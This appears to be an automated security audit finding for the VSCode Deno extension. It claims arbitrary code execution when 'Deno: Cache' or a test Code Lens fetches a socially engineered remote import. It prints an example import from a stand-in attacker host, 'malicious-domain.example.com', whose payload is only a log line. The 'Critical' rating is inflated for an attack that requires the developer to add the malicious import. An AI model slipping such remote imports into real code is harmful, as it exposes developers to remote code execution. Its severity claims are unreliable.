# Valid Vulnerabilities Matching Conditions

## 1. Arbitrary Code Execution via `Deno: Cache` Command and Test Code Lens

**Description:**

An attacker could leverage social engineering to potentially trick a developer into caching and executing a malicious remote module via the "Deno: Cache" command or the Test Code Lens functionality provided by the VSCode Deno extension. Specifically, steps include:

1. The attacker crafts a malicious module hosted on a controlled external URL (`https://malicious-domain.example.com/payload.ts`). This payload contains arbitrary code (e.g., system commands disguised as normal utility code).
2. The attacker socially engineers the target developer (via phishing, tutorials, shared snippets, or community resources) to include the remote malicious URL as an import line in their current open file in VSCode.
3. The developer consciously or unknowingly invokes the "Deno: Cache" command from VSCode's command palette (`Ctrl+Shift+P`) or applies a quick fix to fetch missing dependencies. Additionally, the VSCode developer may invoke "▶️ Run Test" via Code Lens, unintentionally running tests that trigger fetching and execution of scripts from malicious sources.
4. Once the developer triggers the action, VSCode executes a command provided by the extension (`deno cache` or `deno test` commands via CLI) to fetch and cache external modules without explicitly validating the source.
5. The malicious code is retrieved, cached, and potentially executed on developer machines through normal development/test workflows.

**Impact:**

Critical impact of arbitrary code execution (ACE) leading to:

- Remote Command Execution (RCE)
- Complete compromise of developer machines/workstations
- Disclosure/leakage of sensitive data from developer environment or corporate network
- Lateral movement and further exploitation within organization's infrastructure
- Compromise of the entire development workflow and infrastructure

**Vulnerability Rank:**

- **Critical**

**Currently Implemented Mitigations:**

- No automatic invocation of "Deno: Cache" occurs without explicit user interaction or via deliberate Quick Fix action by developer.
- Slightly reduces likelihood but not entirely robust against social engineering attacks or phishing tactics.

**Missing Mitigations:**

- Missing explicit validation, trust establishment, or warnings for modules imported from external origins.
- Lack of explicit security warnings or confirmation prompts presented in VSCode before caching external third-party modules.
- No built-in domain allowlisting or denylisting functionality to restrict fetching external code from unknown or potentially malicious domains.
- Absence of enforced integrity checks or validation (e.g., integrity hashes in lock files) requiring approval or verification prior to fetching remote modules.
- Insufficient explicit confirmations or security mitigations before running tests from Code Lens that could implicitly cause fetching and executing malicious external dependencies.

**Preconditions:**

- Developer must explicitly invoke the "Deno: Cache" command or run tests via Code Lens functionality leading to implicit external code fetching.
- Developer workstation must have external network access to retrieve remote code.
- Developer must be persuaded via social engineering or otherwise tricked into loading/inserting an import statement referencing a malicious module URL into the editor.

**Source Code Analysis:**

- Examination of source code (`vscode_deno/client/src/commands.ts`) reveals explicit command invocation to cache external dependency without security validation or confirmation:

```typescript
export function cacheActiveDocument(): Callback {
  return () => {
    const activeEditor = vscode.window.activeTextEditor;
    if (!activeEditor) return;
    const uri = activeEditor.document.uri.toString();
    return vscode.window.withProgress({
      location: vscode.ProgressLocation.Window,
      title: "caching",
    }, () => vscode.commands.executeCommand("deno.cache", [uri], uri));
  };
}
```

Step-by-step analysis:

- Developer has TypeScript file open in editor (`payload.ts`) containing:

```typescript
import "https://malicious-domain.example.com/payload.ts";
```

- Developer explicitly uses "Deno: Cache" (command palette or quick fix), invoking above code.
- Command maps to execution of `deno cache`, fetching arbitrary remote resource without domain validation. This means external malicious code is downloaded directly to developer workstation without explicit safeguards.

- Test Code Lens invocation (`deno test`) similarly invokes:

```typescript
const args = ["test", ...testArgs, "--filter", nameRegex, filePath];
```

- External modules referenced within test files will be implicitly fetched without explicit domain or integrity checks.

Thus, critical ACE proceeds easily via social engineering tactics.

**Security Test Case:**

To validate exploitability:

1. Attacker hosts a malicious TypeScript payload file externally:

```typescript
// https://malicious-domain.example.com/payload.ts
console.log("Malicious payload executed");
// Potentially replace console.log with actual system command
```

2. Socially engineer developer to include malicious import into their TypeScript file within VSCode workspace:

```typescript
import "https://malicious-domain.example.com/payload.ts";
```

3. Developer executes "Deno: Cache" command (`Ctrl+Shift+P`, type "Deno: Cache", press Enter) or clicks on Code Lens Test execution.
4. Visually confirm remote malicious payload is fetched automatically, cached locally without security warnings or confirmation dialogs, and potentially executed during tests or future invocation.
5. Successfully completed test demonstrates successful fetching and caching of malicious code, confirming the critical vulnerability's real-world exploitability.
